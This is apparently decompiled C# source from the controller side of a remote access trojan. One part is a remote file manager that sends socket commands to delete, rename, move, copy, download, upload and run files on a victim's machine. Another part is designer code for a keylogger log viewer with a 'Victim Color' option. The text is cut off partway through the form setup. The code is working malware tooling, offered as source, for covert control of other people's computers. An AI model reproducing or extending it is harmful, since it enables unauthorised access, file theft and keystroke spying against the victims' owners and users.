								string text2 = listViewItem.ToolTipText + ";*";
								text = arg_A8_0 + arg_A8_1 + FN.ENB(ref text2);
							}
							else
							{
								string arg_CF_0 = text;
								string arg_CF_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";";
								text = arg_CF_0 + arg_CF_1 + FN.ENB(ref text2);
							}
						}
					}
				}
				finally
				{
					bool flag2 = enumerator is IDisposable;
					if (flag2)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "rd";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + sokserver.Y + FN.ENB(ref toolTipText);
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0;
					if (flag)
					{
						bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
						if (flag2)
						{
							string text = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							flag2 = (text.Length > 0);
							if (flag2)
							{
								Client arg_C6_0 = this.sk;
								string arg_C1_0 = "nm";
								string arg_C1_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";" + text + ";*";
								arg_C6_0.Send(arg_C1_0 + arg_C1_1 + FN.ENB(ref text2));
							}
						}
						else
						{
							string text3 = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							flag2 = (text3.Length > 0);
							if (flag2)
							{
								Client arg_12B_0 = this.sk;
								string arg_126_0 = "nm";
								string arg_126_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";" + text3 + ";";
								arg_12B_0.Send(arg_126_0 + arg_126_1 + FN.ENB(ref text2));
							}
						}
					}
				}
			}
			finally
			{
				bool flag2 = enumerator is IDisposable;
				if (flag2)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
					if (flag)
					{
						text = text + ";" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (Operators.CompareString(text, "", false) != 0);
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = false;
			}
		}

		private void ToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			bool flag;
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
					if (flag)
					{
						text = text + ";" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (Operators.CompareString(text, "", false) != 0);
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = true;
			}
		}

		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Flist, "", false) != 0;
			if (flag)
			{
				bool flag2 = this.isCut;
				if (flag2)
				{
					Client arg_96_0 = this.sk;
					string[] array = new string[5];
					array[0] = "mv";
					array[1] = sokserver.Y;
					string[] arg_76_0 = array;
					int arg_76_1 = 2;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					arg_76_0[arg_76_1] = FN.ENB(ref text);
					array[3] = sokserver.Y;
					array[4] = FN.ENB(ref this.Flist);
					arg_96_0.Send(string.Concat(array));
				}
				else
				{
					Client arg_10C_0 = this.sk;
					string[] array = new string[5];
					array[0] = "cp";
					array[1] = sokserver.Y;
					string[] arg_EC_0 = array;
					int arg_EC_1 = 2;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					arg_EC_0[arg_EC_1] = FN.ENB(ref text);
					array[3] = sokserver.Y;
					array[4] = FN.ENB(ref this.Flist);
					arg_10C_0.Send(string.Concat(array));
				}
			}
		}

		private void ToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
					if (flag)
					{
						string[] array = new string[5];
						array[0] = "dw";
						array[1] = sokserver.Y;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						array[2] = FN.ENB(ref toolTipText);
						array[3] = sokserver.Y;
						array[4] = this.sk.ip();
						this.sk.Send(string.Concat(array));
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void ToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client arg_56_0 = this.sk;
				string arg_51_0 = "nf";
				string arg_51_1 = sokserver.Y;
				string text2 = this.TextBox1.Text + text;
				arg_56_0.Send(arg_51_0 + arg_51_1 + FN.ENB(ref text2));
			}
		}

		private void ToolStripMenuItem9_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client arg_56_0 = this.sk;
				string arg_51_0 = "nd";
				string arg_51_1 = sokserver.Y;
				string text2 = this.TextBox1.Text + text;
				arg_56_0.Send(arg_51_0 + arg_51_1 + FN.ENB(ref text2));
			}
		}

		private void OpenDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = !Directory.Exists(this.folder);
			if (flag)
			{
				Directory.CreateDirectory(this.folder);
			}
			try
			{
				Process.Start(this.folder);
			}
			catch (Exception expr_2F)
			{
				ProjectData.SetProjectError(expr_2F);
				Exception projectError = expr_2F;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void RarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.ForeColor = colorDialog.Color;
			this.L2.ForeColor = colorDialog.Color;
			MySettingsProperty.Settings.Save();
		}

		private void UploadFromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1.GridLines = true;
			this.L2.GridLines = true;
			MySettingsProperty.Settings.Save();
		}

		private void ContextMenuStrip3_Opening(object sender, CancelEventArgs e)
		{
		}

		private void ToolStripMenuItem12_Click(object sender, EventArgs e)
		{
		}

		private void UnRarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1.GridLines = false;
			this.L2.GridLines = false;
			MySettingsProperty.Settings.Save();
		}

		private void ColerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.BackColor = colorDialog.Color;
			this.L2.BackColor = colorDialog.Color;
			MySettingsProperty.Settings.Save();
		}

		private void TtToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			bool flag = this.TextBox1.Text.Length > 0;
			if (flag)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "dl";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0);
						if (flag)
						{
							bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
							if (flag2)
							{
								string arg_A8_0 = text;
								string arg_A8_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";*";
								text = arg_A8_0 + arg_A8_1 + FN.ENB(ref text2);
							}
							else
							{
								string arg_CF_0 = text;
								string arg_CF_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";";
								text = arg_CF_0 + arg_CF_1 + FN.ENB(ref text2);
							}
						}
					}
				}
				finally
				{
					bool flag2 = enumerator is IDisposable;
					if (flag2)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "rd";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + sokserver.Y + FN.ENB(ref toolTipText);
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void Button5_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0;
					if (flag)
					{
						bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
						if (flag2)
						{
							string text = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							flag2 = (text.Length > 0);
							if (flag2)
							{
								Client arg_C6_0 = this.sk;
								string arg_C1_0 = "nm";
								string arg_C1_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";" + text + ";*";
								arg_C6_0.Send(arg_C1_0 + arg_C1_1 + FN.ENB(ref text2));
							}
						}
						else
						{
							string text3 = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							flag2 = (text3.Length > 0);
							if (flag2)
							{
								Client arg_12B_0 = this.sk;
								string arg_126_0 = "nm";
								string arg_126_1 = sokserver.Y;
								string text2 = listViewItem.ToolTipText + ";" + text3 + ";";
								arg_12B_0.Send(arg_126_0 + arg_126_1 + FN.ENB(ref text2));
							}
						}
					}
				}
			}
			finally
			{
				bool flag2 = enumerator is IDisposable;
				if (flag2)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					MyProject.Forms.Frm_Main.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_KeyLooger : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		[AccessedThroughProperty("ReToolStripMenuItem")]
		private ToolStripMenuItem _ReToolStripMenuItem;

		[AccessedThroughProperty("SearchToolStripMenuItem")]
		private ToolStripMenuItem _SearchToolStripMenuItem;

		[AccessedThroughProperty("FixBackSpaceToolStripMenuItem")]
		private ToolStripMenuItem _FixBackSpaceToolStripMenuItem;

		[AccessedThroughProperty("ClearLogToolStripMenuItem")]
		private ToolStripMenuItem _ClearLogToolStripMenuItem;

		[AccessedThroughProperty("ProgressBar2")]
		private ProgressBar _ProgressBar2;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		[AccessedThroughProperty("VictimColorToolStripMenuItem")]
		private ToolStripMenuItem _VictimColorToolStripMenuItem;

		[AccessedThroughProperty("ColorLToolStripMenuItem")]
		private ToolStripMenuItem _ColorLToolStripMenuItem;

		[AccessedThroughProperty("TFind")]
		private TextBox _TFind;

		public Client c;

		private ListViewItem last;

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T1_TextChanged);
				bool flag = this._T1 != null;
				if (flag)
				{
					this._T1.TextChanged -= value2;
				}
				this._T1 = value;
				flag = (this._T1 != null);
				if (flag)
				{
					this._T1.TextChanged += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ReToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ReToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ReToolStripMenuItem_Click);
				bool flag = this._ReToolStripMenuItem != null;
				if (flag)
				{
					this._ReToolStripMenuItem.Click -= value2;
				}
				this._ReToolStripMenuItem = value;
				flag = (this._ReToolStripMenuItem != null);
				if (flag)
				{
					this._ReToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem SearchToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SearchToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SearchToolStripMenuItem_Click);
				bool flag = this._SearchToolStripMenuItem != null;
				if (flag)
				{
					this._SearchToolStripMenuItem.Click -= value2;
				}
				this._SearchToolStripMenuItem = value;
				flag = (this._SearchToolStripMenuItem != null);
				if (flag)
				{
					this._SearchToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem FixBackSpaceToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FixBackSpaceToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FixBackSpaceToolStripMenuItem_Click);
				bool flag = this._FixBackSpaceToolStripMenuItem != null;
				if (flag)
				{
					this._FixBackSpaceToolStripMenuItem.Click -= value2;
				}
				this._FixBackSpaceToolStripMenuItem = value;
				flag = (this._FixBackSpaceToolStripMenuItem != null);
				if (flag)
				{
					this._FixBackSpaceToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ClearLogToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ClearLogToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ClearLogToolStripMenuItem_Click);
				bool flag = this._ClearLogToolStripMenuItem != null;
				if (flag)
				{
					this._ClearLogToolStripMenuItem.Click -= value2;
				}
				this._ClearLogToolStripMenuItem = value;
				flag = (this._ClearLogToolStripMenuItem != null);
				if (flag)
				{
					this._ClearLogToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar2 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				flag = (this._ToolStripMenuItem2 != null);
				if (flag)
				{
					this._ToolStripMenuItem2.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				bool flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				flag = (this._ToolStripMenuItem3 != null);
				if (flag)
				{
					this._ToolStripMenuItem3.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem VictimColorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VictimColorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VictimColorToolStripMenuItem_Click);
				bool flag = this._VictimColorToolStripMenuItem != null;
				if (flag)
				{
					this._VictimColorToolStripMenuItem.Click -= value2;
				}
				this._VictimColorToolStripMenuItem = value;
				flag = (this._VictimColorToolStripMenuItem != null);
				if (flag)
				{
					this._VictimColorToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ColorLToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorLToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColorLToolStripMenuItem_Click);
				bool flag = this._ColorLToolStripMenuItem != null;
				if (flag)
				{
					this._ColorLToolStripMenuItem.Click -= value2;
				}
				this._ColorLToolStripMenuItem = value;
				flag = (this._ColorLToolStripMenuItem != null);
				if (flag)
				{
					this._ColorLToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual TextBox TFind
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TFind;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TFind = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_KeyLooger()
		{
			base.Load += new EventHandler(this.Frm_KeyLooger_Load);
			Frm_KeyLooger.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_KeyLooger.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_KeyLooger.__ENCList.Count == Frm_KeyLooger.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_KeyLooger.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_KeyLooger.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_KeyLooger.__ENCList[num] = Frm_KeyLooger.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_KeyLooger.__ENCList.RemoveRange(num, Frm_KeyLooger.__ENCList.Count - num);
						Frm_KeyLooger.__ENCList.Capacity = Frm_KeyLooger.__ENCList.Count;
					}
					Frm_KeyLooger.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_KeyLooger));
			this.ProgressBar1 = new ProgressBar();
			this.MenuStrip1 = new MenuStrip();
			this.ReToolStripMenuItem = new ToolStripMenuItem();
			this.FixBackSpaceToolStripMenuItem = new ToolStripMenuItem();
			this.ClearLogToolStripMenuItem = new ToolStripMenuItem();
			this.SearchToolStripMenuItem = new ToolStripMenuItem();
			this.VictimColorToolStripMenuItem = new ToolStripMenuItem();
			this.ColorLToolStripMenuItem = new ToolStripMenuItem();
			this.T1 = new RichTextBox();
			this.ContextMenuStrip2 = new ContextMenuStrip(this.components);
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem2 = new ToolStripMenuItem();
			this.ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ProgressBar2 = new ProgressBar();
			this.Timer1 = new Timer(this.components);
			this.TFind = new TextBox();
			this.MenuStrip1.SuspendLayout();
			this.ContextMenuStrip2.SuspendLayout();
			this.SuspendLayout();
			Control arg_11C_0 = this.ProgressBar1;
			Point location = new Point(0, 253);
			arg_11C_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_14A_0 = this.ProgressBar1;
			Size size = new Size(600, 10);
			arg_14A_0.Size = size;
			this.ProgressBar1.TabIndex = 0;
			this.MenuStrip1.BackColor = Color.Black;
			this.MenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.ReToolStripMenuItem,
				this.FixBackSpaceToolStripMenuItem,
				this.ClearLogToolStripMenuItem,
				this.SearchToolStripMenuItem,
				this.VictimColorToolStripMenuItem,
				this.ColorLToolStripMenuItem
			});
			Control arg_1DC_0 = this.MenuStrip1;
			location = new Point(0, 0);
			arg_1DC_0.Location = location;
			this.MenuStrip1.Name = "MenuStrip1";
			this.MenuStrip1.RenderMode = ToolStripRenderMode.System;
			Control arg_217_0 = this.MenuStrip1;
			size = new Size(606, 24);
			arg_217_0.Size = size;
			this.MenuStrip1.TabIndex = 1;
			this.MenuStrip1.Text = "MenuStrip1";
			this.ReToolStripMenuItem.BackColor = Color.Transparent;
			this.ReToolStripMenuItem.ForeColor = Color.White;
			this.ReToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ReToolStripMenuItem.Image");
			this.ReToolStripMenuItem.Name = "ReToolStripMenuItem";
			ToolStripItem arg_29E_0 = this.ReToolStripMenuItem;
			size = new Size(74, 20);
			arg_29E_0.Size = size;
			this.ReToolStripMenuItem.Text = "Refresh";
			this.FixBackSpaceToolStripMenuItem.ForeColor = Color.White;
			this.FixBackSpaceToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FixBackSpaceToolStripMenuItem.Image");
			this.FixBackSpaceToolStripMenuItem.Name = "FixBackSpaceToolStripMenuItem";
			ToolStripItem arg_307_0 = this.FixBackSpaceToolStripMenuItem;
			size = new Size(69, 20);
			arg_307_0.Size = size;
			this.FixBackSpaceToolStripMenuItem.Text = " Space";
			this.ClearLogToolStripMenuItem.ForeColor = Color.White;
			this.ClearLogToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ClearLogToolStripMenuItem.Image");
			this.ClearLogToolStripMenuItem.Name = "ClearLogToolStripMenuItem";
			ToolStripItem arg_370_0 = this.ClearLogToolStripMenuItem;
			size = new Size(85, 20);
			arg_370_0.Size = size;
			this.ClearLogToolStripMenuItem.Text = "Clear Log";
			this.SearchToolStripMenuItem.ForeColor = Color.White;
			this.SearchToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SearchToolStripMenuItem.Image");
			this.SearchToolStripMenuItem.Name = "SearchToolStripMenuItem";
			ToolStripItem arg_3D9_0 = this.SearchToolStripMenuItem;
			size = new Size(70, 20);
			arg_3D9_0.Size = size;
			this.SearchToolStripMenuItem.Text = "Search";
			this.VictimColorToolStripMenuItem.BackColor = Color.LightSteelBlue;
			this.VictimColorToolStripMenuItem.ForeColor = Color.AliceBlue;
			this.VictimColorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("VictimColorToolStripMenuItem.Image");
			this.VictimColorToolStripMenuItem.Name = "VictimColorToolStripMenuItem";
			ToolStripItem arg_453_0 = this.VictimColorToolStripMenuItem;
			size = new Size(101, 20);
			arg_453_0.Size = size;
			this.VictimColorToolStripMenuItem.Text = "Victim Color";
			this.ColorLToolStripMenuItem.ForeColor = SystemColors.ControlLight;
			this.ColorLToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColorLToolStripMenuItem.Image");
			this.ColorLToolStripMenuItem.Name = "ColorLToolStripMenuItem";
			ToolStripItem arg_4BC_0 = this.ColorLToolStripMenuItem;
			size = new Size(94, 20);
			arg_4BC_0.Size = size;
			this.ColorLToolStripMenuItem.Text = "Color Lines";
			this.T1.BackColor = Color.Gainsboro;
			this.T1.BorderStyle = BorderStyle.FixedSingle;
			this.T1.ContextMenuStrip = this.ContextMenuStrip2;
			this.T1.Dock = DockStyle.Fill;
			this.T1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
